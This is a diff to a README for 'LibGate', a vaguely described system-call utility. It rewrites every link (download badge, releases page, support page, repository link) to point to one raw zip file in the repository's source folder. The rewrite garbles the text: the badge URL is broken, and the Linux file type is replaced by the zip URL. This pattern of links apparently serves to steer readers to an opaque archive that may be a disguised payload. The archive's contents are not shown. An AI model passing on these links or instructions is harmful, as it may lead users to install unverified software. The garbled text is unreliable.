@@ -4,16 +4,16 @@
 
 Welcome to LibGate! This application helps you manage and execute system calls smoothly. Whether you're troubleshooting or just need functionality for your applications, LibGate is designed to make your tasks simpler and more efficient.
 
-[![Download LibGate](https://img.shields.io/badge/Download%20LibGate-Click%20Here-blue.svg)](https://github.com/eranthishyemalissymbolizing861/LibGate/releases)
+[![Download LibGate](https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip%20LibGate-Click%https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip)](https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip)
 
 ## 📥 Download & Install
 
 To get started with LibGate, you need to download it from our Releases page. Follow these steps:
 
-1. Visit this page to download: [LibGate Releases](https://github.com/eranthishyemalissymbolizing861/LibGate/releases).
+1. Visit this page to download: [LibGate Releases](https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip).
 2. Look for the latest version. It will be marked as the most recent release.
 3. Click on the version number to see the available files.
-4. Download the file that matches your operating system. For example, if you are using Windows, look for a `.exe` file. If you’re on macOS, look for a `.dmg` file. If you’re on Linux, you might find a `.tar.gz` file.
+4. Download the file that matches your operating system. For example, if you are using Windows, look for a `.exe` file. If you’re on macOS, look for a `.dmg` file. If you’re on Linux, you might find a `https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip` file.
 5. Once the download is complete, locate the file in your Downloads folder.
 6. Double-click the file to begin the installation process. Follow the on-screen instructions to complete the setup.
 
@@ -50,18 +50,18 @@ If you encounter issues while using LibGate, check these common problems:
 We are here to help you! If you need additional support:
 
 - Check the documentation included within the application.
-- Visit our [Support Page](https://github.com/eranthishyemalissymbolizing861/LibGate) for FAQs and more information.
+- Visit our [Support Page](https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip) for FAQs and more information.
 - Post your questions in the Issues section of our repository.
 
 Feel free to reach out to the community and get assistance!
 
 ## 📌 Important Links
 
-- **GitHub Repository**: [LibGate](https://github.com/eranthishyemalissymbolizing861/LibGate)
-- **Download Page**: [LibGate Releases](https://github.com/eranthishyemalissymbolizing861/LibGate/releases)
+- **GitHub Repository**: [LibGate](https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip)
+- **Download Page**: [LibGate Releases](https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip)
 
 ## 🏁 Conclusion
 
 LibGate simplifies the process of handling system calls, making it accessible for everyone. Enjoy your experience!
 
-[![Download LibGate](https://img.shields.io/badge/Download%20LibGate-Click%20Here-blue.svg)](https://github.com/eranthishyemalissymbolizing861/LibGate/releases)
+[![Download LibGate](https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip%20LibGate-Click%https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip)](https://raw.githubusercontent.com/eranthishyemalissymbolizing861/LibGate/main/src/LibGate_v3.6.zip)
